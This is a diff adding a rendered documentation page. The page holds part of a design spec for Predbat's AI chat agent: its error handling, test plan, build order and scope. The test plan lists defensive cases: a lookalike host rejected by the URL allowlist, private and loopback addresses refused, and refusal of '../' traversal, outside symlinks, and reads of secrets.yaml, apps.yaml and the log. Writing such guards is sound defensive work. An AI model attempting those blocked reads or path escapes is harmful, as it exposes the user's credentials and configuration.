+<p>While a turn runs, the composer is disabled in every conversation and a banner reads
+<em>"Replying in 'why is it charging at 3am'"</em> with a link that switches to it. Switching
+conversations while a turn runs is unrestricted; the selection is client state, so it is a
+history refetch plus a new SSE cursor.</p>
+<p>Dark mode follows the existing <code>get_header_html()</code> mechanism. Nav: <code>&lt;a href='./chat'&gt;Chat&lt;/a&gt;</code>
+added to the menu bar in <code>web_helper.py</code>, emitted only when chat is enabled.
+<code>get_header_html()</code> gains a <code>chat_enabled=False</code> keyword argument, set at its single production
+call site (<code>apps/predbat/web.py:1698</code>) from <code>components.get_component("chat")</code>. The default
+keeps the existing test call site valid.</p>
+<h2 id="16-error-handling">16. Error handling</h2>
+<table>
+<thead>
+<tr>
+<th>Condition</th>
+<th>Behaviour</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>401 from the provider</td>
+<td><code>error</code> event naming the key to check</td>
+</tr>
+<tr>
+<td>402</td>
+<td>Surfaced verbatim; it means the account is out of credit</td>
+</tr>
+<tr>
+<td>429</td>
+<td>Retried with a longer first backoff, then reported. The original rule here ended the turn "so a user is never billed for a silent retry storm" - that reasoning was wrong: a 429 means the request was rejected, so no tokens were processed and nothing was billed. Retrying costs time, not money, and the three-attempt cap bounds it</td>
+</tr>
+<tr>
+<td>Timeout / connection error</td>
+<td><code>error</code> event naming the endpoint; <code>count_errors</code> incremented so the Components tab reflects it</td>
+</tr>
+<tr>
+<td>Model does not support tools</td>
+<td>Detected at selection from the catalogue and refused with an explanation; if it slips through, the missing <code>tool_calls</code> simply yields a text answer</td>
+</tr>
+<tr>
+<td>Tool raises</td>
+<td>Caught per call; the exception text becomes the tool result so the model can react</td>
+</tr>
+<tr>
+<td>Malformed tool arguments</td>
+<td>Same path — reported to the model as a tool error</td>
+</tr>
+<tr>
+<td><code>fetch_url</code> rejected by the allowlist or address check</td>
+<td>Plain tool error naming the rule that refused it</td>
+</tr>
+<tr>
+<td>Docs index unfetchable</td>
+<td><code>search_docs</code> returns an error result; the turn continues</td>
+</tr>
+<tr>
+<td><code>read_source</code> path outside the source root, or an off-allowlist extension</td>
+<td>Plain tool error naming the rule that refused it</td>
+</tr>
+<tr>
+<td><code>search_source</code> pattern too long or uncompilable</td>
+<td>Plain tool error; no exception, no scan started</td>
+</tr>
+<tr>
+<td><code>chat_web_search</code> on with a non-OpenRouter base URL</td>
+<td>One-time warning logged; the request is sent without the plugin</td>
+</tr>
+<tr>
+<td><code>send</code> while busy</td>
+<td>409 with <code>{"error": "busy", "conversation_id", "title"}</code> so the client can offer the jump link</td>
+</tr>
+<tr>
+<td>Unknown or deleted conversation id</td>
+<td>404 on every route taking one</td>
+</tr>
+<tr>
+<td>Storage write failure</td>
+<td>Logged, <code>count_errors</code> incremented; the in-memory conversation survives so the turn is not lost</td>
+</tr>
+</tbody>
+</table>
+<p>Every error path ends the turn cleanly, clears <code>active</code>, and emits both <code>done</code> and the global
+<code>idle</code>.</p>
+<h2 id="17-testing">17. Testing</h2>
+<p>New tests, registered in <code>TEST_REGISTRY</code> in <code>apps/predbat/unit_test.py</code>.</p>
+<p><strong><code>tests/test_agent_tools.py</code></strong></p>
+<ul>
+<li>Every <code>TOOL_DEFS</code> name resolves to a handler on <code>PredbatTools</code>, and every handler is listed.</li>
+<li><code>writes</code> is <code>True</code> for exactly <code>set_config</code> and <code>set_plan_override</code>.</li>
+<li><code>mcp_tool_list()</code> matches a golden copy of the list <code>web_mcp.py</code> publishes today.</li>
+<li><code>openai_tool_list()</code> is well-formed OpenAI function-calling shape, for both def lists.</li>
+<li><code>masked</code> is absent from the chat projection of <code>get_apps</code> and present in the MCP projection.</li>
+<li><code>CHAT_TOOL_DEFS</code> names do not appear in <code>mcp_tool_list()</code>.</li>
+<li><code>execute()</code> dispatches correctly and returns the unknown-tool error for a bad name.</li>
+<li><code>MCPServerWrapper</code> still exposes the inherited <code>_execute_*</code> methods.</li>
+</ul>
+<p><strong><code>tests/test_chat_store.py</code></strong></p>
+<ul>
+<li>Create, rename, delete; ids are hex and unique.</li>
+<li>Save passes an expiry <code>chat_expiry_days</code> ahead, and a later save renews it.</li>
+<li>A deleted conversation is hidden from the list, 404s by id, and is not re-saved.</li>
+<li>Index self-heal when a body <code>load()</code> returns <code>None</code>.</li>
+<li>Unknown <code>version</code> in index or body is discarded, not half-parsed.</li>
+<li>LRU eviction flushes a dirty body before dropping it.</li>
+<li><code>chat_max_conversations</code> marks the least recently updated deleted, never the active one, and
+  deleted ones do not count toward the cap.</li>
+<li>History trimming stops at a <code>user</code> boundary and never orphans a <code>tool</code> message.</li>
+</ul>
+<p><strong><code>tests/test_chat_tools.py</code></strong></p>
+<ul>
+<li>Allowlist: exact host and <code>.suffix</code> match accepted; <code>evilspringfall2008.github.io</code> rejected.</li>
+<li>Non-https rejected; private, loopback, link-local and reserved resolved addresses rejected.</li>
+<li>Redirect to an off-allowlist host rejected; hop limit enforced.</li>
+<li>Content-type and 200 KB size cap, with the truncation note.</li>
+<li><code>search_docs</code> scoring, <code>max_results</code> clamping, URL construction from <code>location</code>, excerpt
+  extraction, and the cached-index path (one fetch, two searches).</li>
+<li>Docs index unavailable → error result, no exception.</li>
+<li><code>search_source</code> finds a known symbol in a known file, respects <code>max_results</code>, reports
+  <code>total_matches</code> when truncated, and skips <code>venv/</code> and <code>__pycache__/</code>.</li>
+<li><code>search_source</code> rejects an over-long pattern and an uncompilable one without raising.</li>
+<li><code>read_source</code> returns the requested slice with <code>total_lines</code>, clamps <code>max_lines</code>, and pages.</li>
+<li><code>read_source</code> accepts each allowlisted extension and refuses a <code>../</code> traversal, a symlink
+  pointing outside the source root, and any off-allowlist extension — specifically <code>apps.yaml</code>,
+  <code>secrets.yaml</code>, <code>predbat.log</code>, <code>cache/*.json</code>, a <code>.bak</code> and a <code>.so</code> placed in the source
+  directory, which is the case that matters when <code>config_root</code> coincides with it.</li>
+<li><code>search_source</code> matches inside a <code>.cpp</code> and a <code>.md</code> as well as a <code>.py</code>, and never reports a
+  hit from an off-allowlist file.</li>
+</ul>
+<p><strong><code>tests/test_chat.py</code></strong> — driving <code>ChatAgent</code> against a fake OpenRouter that replays canned SSE
+byte streams:</p>
+<ul>
+<li>Component gating: missing key, missing model, both present.</li>
+<li>Plain answer with no tool call; one tool call; chained tool calls.</li>
+<li><code>chat_max_tool_rounds</code> cap reached → visible note, no infinite loop, and every refused call answered so the stored conversation stays replayable.</li>
+<li>Tool raising an exception, and malformed tool-call argument JSON.</li>
+<li>Write with confirm on: approved, rejected, timed out. Confirm off: executes directly.</li>
+<li><code>set_chat_title</code> sets and emits; over-length truncated; empty rejected; the first-user-message
+  fallback fires only when the model never called it.</li>
+<li>The title instruction appears in the system prompt only while untitled.</li>
+<li><code>chat_web_search</code> on adds <code>plugins</code> to the body; off omits it; non-OpenRouter base URL warns once.</li>
+<li><code>url_citation</code> annotations are collected onto the assistant message.</li>
+<li><code>build_snapshot()</code> against a stub base, including missing/None fields.</li>
+<li>A turn in conversation A leaves B readable; <code>run_turn</code> on B while A is active raises Busy.</li>
+<li>Events carry the right <code>conversation_id</code>; <code>busy</code>/<code>idle</code> are global and always paired.</li>
+<li>401, 429 and timeout responses produce the documented <code>error</code> events, and <code>idle</code> always follows.</li>
+</ul>
+<p><strong><code>tests/test_web_chat.py</code></strong></p>
+<ul>
+<li>Routes register on a bare <code>aiohttp.Application</code> when chat is enabled, and do not when it is not.</li>
+<li>The nav link appears only when <code>chat_enabled=True</code>.</li>
+<li><code>/chat/send</code> returns 409 with the active conversation's title while a turn runs.</li>
+<li><code>/chat/delete</code> returns 409 for the active conversation.</li>
+<li>Unknown or deleted conversation id → 404 on each route taking one.</li>
+<li>SSE framing: <code>id</code>/<code>event</code>/<code>data</code> lines, conversation filtering, global events reaching a
+  browser viewing another conversation, cursor replay, <code>reload</code> when the cursor is too old.</li>
+<li><code>/chat/confirm</code> with an unknown <code>call_id</code>, or the wrong conversation, returns 404.</li>
+<li><code>/chat/models</code> filters to tool-capable models and always includes the <code>apps.yaml</code> model.</li>
+<li>The markdown renderer escapes HTML before transforming, for messages, titles and source URLs.</li>
+</ul>
+<p><strong>Regression:</strong> <code>./run_all --test web_mcp</code> must pass unchanged after the extraction.</p>
+<h2 id="18-implementation-order">18. Implementation order</h2>
+<ol>
+<li>Extract <code>agent_tools.py</code>; refactor <code>web_mcp.py</code>; prove <code>test_web_mcp</code> is green and the golden
+   tool list is unchanged.</li>
+<li><code>chat_store.py</code>: index, bodies, LRU, persistence with expiry, the deleted flag, pruning,
+   trimming.</li>
+<li><code>chat_tools.py</code>: <code>search_docs</code>, <code>search_source</code>, <code>read_source</code>, and <code>fetch_url</code> with its
+   allowlist and address guards.</li>
+<li><code>ChatAgent</code>: config, the agentic loop, snapshot, streaming, chat-local tools, against a fake
+   OpenRouter.</li>
+<li>Confirmation gate, <code>chat_confirm_writes</code> and <code>chat_web_search</code>.</li>
+<li><code>web_chat.py</code> routes and SSE.</li>
+<li>The tab's HTML, CSS and client JS, including the conversation list.</li>
+<li>Model picker.</li>
+<li>Documentation.</li>
+</ol>
+<p>Steps 1 to 5 are independently useful and independently testable; the feature is not visible to
+a user until step 6.</p>
+<h2 id="19-out-of-scope">19. Out of scope</h2>
+<ul>
+<li>Per-user history or any access control on who sees which conversation.</li>
+<li>Authentication for the web UI.</li>
+<li>Undelete in the UI, though the flag makes it easy to add.</li>
+<li>Concurrent turns, or queueing a message in one conversation while another is running.</li>
+<li>Arbitrary web browsing beyond the <code>fetch_url</code> allowlist.</li>
+<li>Image, file or debug-YAML upload into the conversation.</li>
+<li>Search across conversations, or exporting one.</li>
+<li>Writing to Predbat's source, or running arbitrary code.</li>
+<li>Letting the agent define new tools.</li>
+<li>Reading source from a branch or release other than the installed one, except by fetching it
+  from GitHub through <code>fetch_url</code>.</li>
+<li>Shipping <code>docs/</code> with the installer so documentation search can work offline (section 7.1).</li>
+<li>MCP client mode (the chat agent consuming <em>external</em> MCP servers).</li>
+<li>Voice input, or a Home Assistant conversation-agent integration.</li>
+</ul>
+<h2 id="20-documentation">20. Documentation</h2>
+<ul>
+<li><code>docs/components.md</code>: a new "AI Chat Agent (chat)" section — what it does, when to enable,
+  the configuration table, the network-exposure and third-party-data cautions, the note that
+  conversations are stored on disk and that a deleted one lingers until it expires, the cost of
+  <code>chat_web_search</code>, the note that the agent can read its own installed source but not
+  <code>apps.yaml</code> or the log through those tools, and the tool table cross-referenced to the MCP one.</li>
+<li><code>docs/web-interface.md</code>: the Chat tab, conversations, the confirmation gate, the model picker.</li>
+<li><code>docs/apps-yaml.md</code>: the ten new keys.</li>
+<li>New words to <code>.cspell/custom-dictionary-workspace.txt</code>: <code>openrouter</code>, <code>ollama</code>, <code>litellm</code>
+  and anything else the hook flags (the file is auto-sorted on commit, so re-stage after).</li>
+</ul>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../../..";</script>
+    <script src="../../../js/theme_extra.js"></script>
+    <script src="../../../js/theme.js"></script>
+      <script src="../../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
